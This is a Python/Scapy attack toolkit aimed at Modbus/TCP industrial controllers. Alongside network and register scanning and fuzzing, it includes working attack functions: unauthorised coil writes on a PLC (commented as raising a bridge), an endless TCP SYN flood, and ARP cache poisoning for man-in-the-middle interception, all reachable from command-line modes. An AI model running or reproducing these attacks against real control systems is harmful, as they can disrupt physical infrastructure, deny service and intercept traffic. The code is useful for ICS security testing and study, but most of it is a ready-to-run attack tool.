#!/usr/bin/env python
# -*- coding: utf-8 -*-

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys
import argparse
import time
import threading

from scapy.all import *

from modbus import *
from netaddr import *

# try:
#    user_input = input()
# except KeyboardInterrupt:
#    sys.exit(0)

modport = 502
iface = ""
verbose = False
transId = 1
#Device Identification Object range
MINOBJECTID = 1 # Start at 1
MAXOBJECTID = 256 # Ends at 256
# Function codes range
MINCODE = 1  # 0 is illegal
MAXCODE = 45  # Upper than 127 are exception codes
# Registers Address range
MINADDR = 0
MAXADDR = 256  # Default : 256

class MBregisters():
	"""
	This class sniff traffic and initiate the reply
	"""
	def __init__(self, ip):
		self.ip = ip
		self.code = []
		self.coils = {}
		self.inDiscrete = {}
		self.holdReg = {}
		self.regIn = {}
		self.devId = {}
		
	def setCode(self, code):
		if self.code.count(code) == 0: 
			self.code.append(code)
	def setCoil(self, addr, value):
		self.coils[addr] = value
	def setInDiscrete(self, addr, value):
		self.inDiscrete[addr] = value
	def setHoldReg(self, addr, value):
		self.holdReg[addr] = value
	def setRegIn(self, addr, value):
		self.regIn[addr] = value
	def setDevId(self, addr, value):
		self.devId[addr] = value

	"""
	Read Device diagnostic
	"""
	def scanDeviceIdent(self):
		global MINOBJECTID, MAXOBJECTID, iface
		# Open connection
		c = connectMb(self.ip)
		
		for objId in range(MINOBJECTID, MAXOBJECTID):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=4, objectId=objId)
			ans = c.sr1(pkt, verbose=verbose, iface=iface)
			ans = ModbusADU_Response(str(ans))
	
			if ans.funcCode == 0x2B:
				if ans[ModbusPDU2B_Read_Device_Identification_Response].objCount == 1:			
					self.setDevId(objId, ans[ModBusPDU_ObjectId].value)
	
		# Close connection
		c.close()
	
	"""
	Test the device function codes defined
	"""			
	def checkCodeDefined(self, code):
		global verbose, iface
##		knownFunctions = [1, 2, 3, 4, 5, 6, 7, 15, 16, 17, 20, 21, 22, 23, 24, 43]	
		
		#Check if code has been already set
		if self.code.count(code) > 0:
			return
		
		# Open connection
		c = connectMb(self.ip)
		
		if code == 1:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU01_Read_Coils_Request()		
		elif code == 2:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU02_Read_Discrete_Inputs_Request()		
		elif code == 3:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU03_Read_Holding_Registers_Request()		
		elif code == 4:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU04_Read_Input_Registers_Request()		
		elif code == 5:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU05_Write_Single_Coil_Request()		
		elif code == 6:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU06_Write_Single_Register_Request()		
		elif code == 7:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU07_Read_Exception_Status_Request()		
		elif code == 15:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU0F_Write_Multiple_Coils_Request()		
		elif code == 16:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU10_Write_Multiple_Registers_Request()		
		elif code == 17:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU11_Report_Slave_Id_Request()		
		elif code == 20:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU14_Read_File_Record_Request()		
		elif code == 21:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU15_Write_File_Record_Request()		
		elif code == 22:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU16_Mask_Write_Register_Request()		
		elif code == 23:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU17_Read_Write_Multiple_Registers_Request()		
		elif code == 24:
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU18_Read_FIFO_Queue_Request()		
		elif code == 43:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request()		
		else:
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU00_Generic_Request(funcCode=code)
#FIXME:  Considering the packet forged, we try to put good values and length with the codes known and remove extra payload (seems not working)
			pkt = ModbusADU_Request(str(pkt))
		
		try:			
			if verbose:
				print pkt.summary()
			ans = c.sr1(pkt, timeout=1000, verbose=False, iface=iface)
			ansADU = ModbusADU_Response(str(ans))
			if verbose:
				print ansADU.summary()

			if pkt.funcCode == ansADU.funcCode:
				if verbose:
					print "Code " + str(pkt.funcCode) + " defined"
				self.setCode(ansADU.funcCode)
			else:
				if verbose:
					print "Code " + str(pkt.funcCode) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
		except:
			if verbose:
				print "Something bad with " + str(pkt.funcCode)
		c.close()

	
	def checkAllCodes(self, intrusive = False):
		global MINCODE, MAXCODE
		writingFunctions = [5, 6, 15, 16, 21, 22, 23]				
		
		for code in range(MINCODE, MAXCODE):
			if not intrusive and code in writingFunctions:
				if verbose:
					print "Not testing the writing function : " + str(code)
				continue
			self.checkCodeDefined(code)


	def checkCoilsDefined(self):
		global verbose, MINADDR, MAXADDR, iface
		self.checkCodeDefined(1)
		if 1 not in self.code:
			if verbose:
				print "Read coils function not defined"
			return
			
		c = connectMb(self.ip)
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=verbose, iface=iface)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
						print "Coil Addr " + str(addr) + " defined"
				self.setCoil(addr, None)
			else:
				if verbose:
					print "Coil Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
				#Does not need to go further (sequential)
				break
		c.close()



	def checkInDiscreteDefined(self):
		global verbose, MINADDR, MAXADDR, iface
		self.checkCodeDefined(2)
		if 2 not in self.code:
			if verbose:
				print "Input Discrete function not defined"
			return
			
		c = connectMb(self.ip)
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=verbose, iface=iface)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
						print "Input Discrete Addr " + str(addr) + " defined"
				self.setInDiscrete(addr, None)
			else:
				if verbose:
					print "Input Discrete Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
				#Does not need to go further (sequential)
				break
		c.close()

	def checkHoldRegDefined(self):
		global verbose, MINADDR, MAXADDR, iface
		self.checkCodeDefined(3)
		if 3 not in self.code:
			if verbose:
				print "Holding Register function not defined"
			return
			
		c = connectMb(self.ip)
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=verbose, iface=iface)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
						print "Holding Register Addr " + str(addr) + " defined"
				self.setHoldReg(addr, None)
			else:
				if verbose:
					print "Holding Register Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
				#Does not need to go further (sequential)
				break
		c.close()

	def checkRegInDefined(self):
		global verbose, MINADDR, MAXADDR, iface
		self.checkCodeDefined(4)
		if 4 not in self.code:
			if verbose:
				print "Input register function not defined"
			return
			
		c = connectMb(self.ip)
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=verbose, iface=iface)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
						print "Input register Addr " + str(addr) + " defined"
				self.setRegIn(addr, None)
			else:
				if verbose:
					print "Input register Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
				#Does not need to go further (sequential)
				break
		c.close()
	
	def printMe(self):
		if len(self.code) > 0:
			print "Function Code : " + str(self.code)
		if len(self.coils) > 0:
			print "Coils : " + str(self.coils)
		if len(self.inDiscrete) > 0:
			print "Input Discrete : " + str(self.inDiscrete)
		if len(self.holdReg) > 0:
			print "Holding Register : " + str(self.holdReg)
		if len(self.regIn) > 0:
			print "Input Register : " + str(self.regIn)
		if len(self.devId) > 0:
			print "Device Id :"
			for objId, value in self.devId.iteritems():
				print "  ["+str(objId)+"] " + value
				
		
class SniffMB(threading.Thread):
	"""
	This class sniff traffic and initiate the reply
	"""
	def __init__(self, ip):
		threading.Thread.__init__(self)
		self._stopevent = threading.Event()
		self.querys = {}
		self.myReg = MBregisters(ip)

	def run(self):
		"""
		Sniffing traffic
		"""
		global verbose, iface

		if verbose:
			print("Sniffing...")
#		try:
		sniff(prn=self.__reply, iface=iface, filter="port " + str(modport), timeout = 20)
#		except KeyboardInterrupt:
#			sys.exit(0)
#		except:
#			print("[LISTENING] Unexpected error:"), sys.exc_info()[0]

		self.myReg.printMe()
		return

	def __reply(self, pkt):
		"""
		Reply to received packet sniffed
		@param pkt: packet
		"""	
		
		if ModbusADU_Request in pkt:
			index = str(pkt[IP].src) + " >> " + str(pkt[IP].dst) + " [" + str(pkt[ModbusADU_Request].transId) + "]"
			self.querys[index] = pkt
		elif ModbusADU_Response in pkt:
			index = str(pkt[IP].dst) + " >> " + str(pkt[IP].src) + " [" + str(pkt[ModbusADU_Response].transId) + "]"
			
			#If we do not have the query, we reject the packet
			if self.querys[index] is None:
				return

			query = self.querys[index]
			del self.querys[index]

			i = 0
			if ModbusPDU01_Read_Coils_Response in pkt and ModbusPDU01_Read_Coils_Request in query:	
				for addr in range (query[ModbusPDU01_Read_Coils_Request].startAddr, query[ModbusPDU01_Read_Coils_Request].startAddr + query[ModbusPDU01_Read_Coils_Request].quantity):
					self.myReg.setCoil(addr, pkt[ModbusPDU01_Read_Coils_Response].coilStatus[i])
					i+=1
			elif ModbusPDU02_Read_Discrete_Inputs_Response in pkt and ModbusPDU02_Read_Discrete_Inputs_Request in query:
				for addr in range (query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr, query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr + query[ModbusPDU02_Read_Discrete_Inputs_Request].quantity):
					self.myReg.setInDiscrete(addr, pkt[ModbusPDU02_Read_Discrete_Inputs_Response].inputStatus[i])
					i+=1
			elif ModbusPDU03_Read_Holding_Registers_Response in pkt and ModbusPDU03_Read_Holding_Registers_Request in query:
				for addr in range (query[ModbusPDU03_Read_Holding_Registers_Request].startAddr, query[ModbusPDU03_Read_Holding_Registers_Request].startAddr + query[ModbusPDU03_Read_Holding_Registers_Request].quantity):
					self.myReg.setHoldReg(addr, pkt[ModbusPDU03_Read_Holding_Registers_Response].registerVal[i])
					i+=1
			elif ModbusPDU04_Read_Input_Registers_Response in pkt and ModbusPDU04_Read_Input_Registers_Request in query:
				for addr in range (query[ModbusPDU04_Read_Input_Registers_Request].startAddr, query[ModbusPDU04_Read_Input_Registers_Request].startAddr + query[ModbusPDU04_Read_Input_Registers_Request].quantity):
					self.myReg.setRegIn(addr, pkt[ModbusPDU04_Read_Input_Registers_Response].registerVal[i])
					i+=1
#TODO: interprete other codes
			else:
				return

"""
Open a new Streamsocket
"""
def connectMb(ipDest):
	s = socket.socket()
	s.connect((ipDest, modport)) 
	c = StreamSocket(s, Raw)
	return c

"""
Close opened socket
"""
def closeMb(c):
	c.close()

"""
Generates an unique transaction ID
"""
def getTransId():
	global transId
	transId = transId + 1
	if transId > 65535:
		transId = 1
	return transId

"""
Scan IP range to detect IP who respond on modbusport
"""
def scanNetwork(ipRange, timeout):
	global verbose, modport
		
	ipResponding = []
			
	if verbose:
		print "Starting Scan..."

	for ip in IPNetwork(ipRange):
		try:
			# socket object instantiation
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			# set socket timeout, value from cmd is in mills
			s.settimeout(float(timeout) / float(1000))			

			# connect requires ip addresses in string format so it must be cast
			s.connect((str(ip), modport))
			if verbose:
				print "- " + str(ip) + " is alive"		
			ipResponding.append(str(ip))

		except socket.error:
			if verbose:
				print "- " + str(ip) + " is not alive"		
	
		s.close()
		
	return ipResponding

"""
Example of writing in coils
   Here, we make lift the bride
"""
def injectValue(ip):
	global iface
	# Open connection
	c = connectMb(ip)
	
	# Get the bridge to raise
	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0000, outputValue=0xFF00)
	c.sr1(myPayload, iface=iface)
	
	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0001, outputValue=0xFF00)
	c.sr1(myPayload, iface=iface)

	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0002, outputValue=0xFF00)
	c.sr1(myPayload, iface=iface)

	# close connection
	c.close()

"""
TCP SYN Flood
"""
def SYN_flood(ip, timeout):
	global verbose, iface, modport, modport
	
	if verbose:
		print "SYN Flooding " + str(ip) + " in progress..."
		print "  > Interrupt with Ctrl+c"

	while True:
		p = IP(dst=str(ip))/TCP(sport=RandNum(1024, 65535), dport=modport, flags="S")
		send(p, iface=iface, verbose=False)


"""
Test malformated packet
"""
def MBfuzzing(ip, test, quantity=50):
	global verbose, iface
		
	# Fuzzing test for reading
	for i in range (1, quantity):
		# Open connection
		c = connectMb(ip)
		
		# Revu all possible tests
		
		# Fuzz read_coils_request		
		pkt = None
		if test == 1:
			ADU = ModbusADU_Request(transId=getTransId())
			pkt = ADU / fuzz(ModbusPDU01_Read_Coils_Request(funcCode=1))
		# Fuzz write_single_coils_request		
		elif test == 2:
			ADU = ModbusADU_Request(transId=getTransId())
			pkt = ADU / fuzz(ModbusPDU05_Write_Single_Coil_Request(funcCode=5))
		# Test ADU transId = 0
		elif test == 3:
			pkt = ModbusADU_Request(transId=0, protoId=0, unitId=0) / ModbusPDU01_Read_Coils_Request()
		# Fuzz on ADU proto Id, unitId
		elif test == 4:
			pkt = fuzz(ModbusADU_Request(transId=getTransId())) / ModbusPDU01_Read_Coils_Request()
			
		if pkt is None:
			print "No test asked"
			return
		
		print str(i) + " - " + pkt.summary()	
		
		ans = c.sr1(pkt, verbose=verbose, iface=iface)
		if ans is not None:
			ans = ModbusADU_Response(str(ans))
			print ans.summary()
		
		c.close()

"""
Test of reassembling Device identification packets
"""
def fragIdentif(ip):
	global iface
	# Open connection
	c = connectMb(ip)
	more = 255
	objectId = 0
	while more == 255:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=3, objectId=objectId)
		ans = c.sr1(pkt, verbose=verbose, iface=iface)
		ans = ModbusADU_Response(str(ans))

		if ans.funcCode == 0x2B:
			print "Objects in msg : " + str(ans[ModbusPDU2B_Read_Device_Identification_Response].objCount)

			more = ans[ModbusPDU2B_Read_Device_Identification_Response].more
			objectId = ans[ModbusPDU2B_Read_Device_Identification_Response].nextObjId
		else:
			more = 0	
	
	c.close()

"""
Retreive a specific value of a register
"""
def getValue(c, code, addr):
	global iface
	
	if code == 1:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr)		
	elif code == 2:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr)		
	elif code == 3:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr)		
	elif code == 4:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr)		
	else:
		return None
	
	ans = c.sr1(pkt, verbose=verbose, iface=iface)
	ans = ModbusADU_Response(str(ans))
	
	if ans.funcCode == 1:
		return ans[ModbusPDU01_Read_Coils_Response].coilStatus[0]
	elif ans.funcCode == 2:
		return ans[ModbusPDU02_Read_Discrete_Inputs_Response].inputStatus[0]
	elif ans.funcCode == 3:
		return ans[ModbusPDU03_Read_Holding_Registers_Response].registerVal[0]
	elif ans.funcCode == 4:
		return ans[ModbusPDU04_Read_Input_Registers_Response].registerVal[0]
	else:
		return None
	

"""
Active Device Monitoring
Input the device for its values
"""
def activeMonitoring(ip, timeout):
	global verbose
	refreshDelay = 1 #sleep time
	
	myDevice = MBregisters(ip)
	for code in [1,2,3,4]:
		myDevice.checkCodeDefined(code)
	if 1 in myDevice.code:
		myDevice.checkCoilsDefined()
	if 2 in myDevice.code:
		myDevice.checkInDiscreteDefined()
	if 3 in myDevice.code:
		myDevice.checkHoldRegDefined()
	if 4 in myDevice.code:
		myDevice.checkRegInDefined()
	
	c = connectMb(ip)
	
	while True:
		for addr in myDevice.coils:
			myDevice.setCoil(addr, getValue(c, 1, addr))
			
		for addr in myDevice.inDiscrete:
			myDevice.setInDiscrete(addr, getValue(c, 2, addr))

		for addr in myDevice.holdReg:
			myDevice.setHoldReg(addr, getValue(c, 3, addr))

		for addr in myDevice.regIn:
			myDevice.setRegIn(addr, getValue(c, 4, addr))

		myDevice.printMe()

		time.sleep(refreshDelay)

	c.close()
	
"""
Passive Device Monitoring
Listen the traffic for the device values
"""
def passiveMonitoring(ip, timeout):
		sniffer = SniffMB(ip)
		sniffer.start()
		#time.sleep(10)
		sniffer.join()


"""
Define tool for an ARP Cache poisonning
"""
class ARPCachePoisonning(threading.Thread):
	def __init__(self, clientMAC, clientIP, gatewayMAC, gatewayIP):
		threading.Thread.__init__(self)
		self.clientMAC = clientMAC
		self.clientIP = clientIP
		self.gatewayMAC = gatewayMAC
		self.gatewayIP = gatewayIP
	def run(self):
		self.sniffARP()
		
	"""
	Send a gratuitous spoofed ARP
	"""
	def poisonARP(self):
		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst=self.clientMAC))
		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst=self.gatewayMAC))
	def restoreARP(self):
		send(ARP(op=2, pdst=self.gatewayIP, psrc=self.clientIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.clientMAC), count=3)
		send(ARP(op=2, pdst=self.clientIP, psrc=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewayMAC), count=3)

#	def sniffARP(self):
#		sniff(prn=self.replyARP, filter="arp", timeout=60, iface=iface)
	def enableForwarding(self):
		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
			ipf.write('1\n')
	def disableForwarding(self):
		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
			ipf.write('0\n')
#	def replyARP(self, pkt):
# 		global iface
# 		if pkt[ARP].op != 1:
# 			print "OP Code : " + str(pkt[ARP].op)
# 			return
# 		if pkt[Ether].src != self.clientMAC:
# 			print str(pkt[Ether].src) + "<>" + str(self.clientMAC)
# 			return
# 		
# 		print pkt.show()
# 		
# 		send( Ether(dst=self.clientMAC)/ARP(op=2, psrc=self.gatewayIP, pdst=self.clientIP), inter=RandNum(10,40), loop=1, iface=iface )
	def poison(self):
		self.enableForwarding();
		self.running = True
		while self.running is True:
			self.poisonARP();
		
		self.restoreARP();
		self.disableForwarding();
	def ends(self):
		self.running = False
		
"""
Launch an ARP poisonning attack
"""
def launchARPpoisonning(clientIP, gatewayIP):
	global verbose, iface
	
	clientMAC = getmacbyip(clientIP)
	gatewayMAC = getmacbyip(gatewayIP)
	if clientMAC is None or gatewayMAC is None:
		if verbose:
			print "Cannot get MAC addr"
		return None
	
	t = ARPCachePoisonning(clientMAC, clientIP, gatewayMAC, gatewayIP)
	t.poison()
	sniff(prn=viewPkt, filter="icmp", timeout=60, iface=iface)

	t.ends()


def viewPkt(pkt):
	print pkt.summary()

"""
What to do if the script is call by  CLI and not imported
"""
if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-m", "--mode",
                        choices=['scanNetwork', 'scanDeviceCode','scanDevice','scanDeviceIdent', 'injectValue', 'interact','ARPPoisonning', 'SYN_flood', 'activeMonitor', 'passiveMonitor' ],
                        help='mode of use :\n'
							'scanNetwork = Scan ip range to find devices responding on Modbus port,'
							'scanDeviceCode = Scan function codes defined,'
							'scanDevice = Scan function code and register definition,'
							'scanDeviceIdent = Scan device identification,'
							'injectValue = Write values in some registers'
						)
	parser.add_argument("-t", "--target", help="IP range", default="127.0.0.1")	
	parser.add_argument("-g", "--gateway", help="IP gateway", default="127.0.0.1")	
	parser.add_argument("-x", "--timeout", help="Timeout in ms of connection", default=100)	
	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
	parser.add_argument("-c", "--intrusive", help="Make modification on PLC (use of Write functions)", action="store_true")
	parser.add_argument("-i", "--interface", help="Network interface (eth0, etc.)", default="eth0")
	
	args = parser.parse_args()

	if args.verbose:	
		verbose = args.verbose

	if args.interface:	
		iface = args.interface

	if args.interface:	
		timeout = args.timeout

	if args.mode == "scanNetwork":
		for ip in scanNetwork(args.target, args.timeout):
			print ip
	elif args.mode == "scanDeviceCode":
		myDev = MBregisters(args.target)
		myDev.checkAllCodes(args.intrusive)
		myDev.printMe()
	elif args.mode == "scanDevice":
		myDev = MBregisters(args.target)
		myDev.checkAllCodes(args.intrusive)
		myDev.checkCoilsDefined()
		myDev.checkInDiscreteDefined()
		myDev.checkHoldRegDefined()
		myDev.checkRegInDefined()
		myDev.scanDeviceIdent()
		myDev.printMe()
	elif args.mode == "scanDeviceIdent":
		myDev = MBregisters(args.target)
		myDev.scanDeviceIdent()
		myDev.printMe()
	elif args.mode == "ARPPoisonning":
		launchARPpoisonning(args.target, args.gateway)
	elif args.mode == "injectValue":
		injectValue(args.target)
	elif args.mode == "SYN_flood":
		SYN_flood(args.target, args.timeout)
	elif args.mode == "fuzz":
		MBfuzzing(args.target, 3)
	elif args.mode == "interact":
		interact(mydict=globals())
	elif args.mode == "activeMonitor":
		activeMonitoring(args.target, args.timeout)	
	elif args.mode == "passiveMonitor":
		passiveMonitoring(args.target, args.timeout)	
	elif args.mode == "fragIdentif":
		fragIdentif(args.target)
	else:
		parser.print_help()
